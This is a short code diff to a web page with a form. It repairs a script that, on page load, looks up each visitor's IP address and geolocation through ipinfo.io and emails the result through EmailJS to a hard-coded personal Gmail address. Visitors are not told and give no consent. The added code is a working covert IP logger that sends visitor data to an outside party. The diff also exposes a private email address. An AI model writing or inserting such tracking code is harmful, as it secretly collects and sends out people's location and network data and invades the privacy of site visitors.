@@ -54,15 +54,17 @@ form label {
 </script>
 </body>
 <script type="text/javascript">
-var ip_ku =   $.getJSON('https://ipapi.co/json/', function(data) {});
- console.log(ip_ku);
+$.getJSON('https://ipinfo.io/json', function(data) {
+  console.log(JSON.stringify(data, null, 2));
 var template_params = {
    "to_email": "rmharianja@gmail.com",
-   "message_html": ip_ku
+   "message_html": JSON.stringify(data, null, 2)
 }
 
 var service_id = "default_service";
 var template_id = "test";
 emailjs.send(service_id, template_id, template_params);
+
+});
 </script>
 </html>
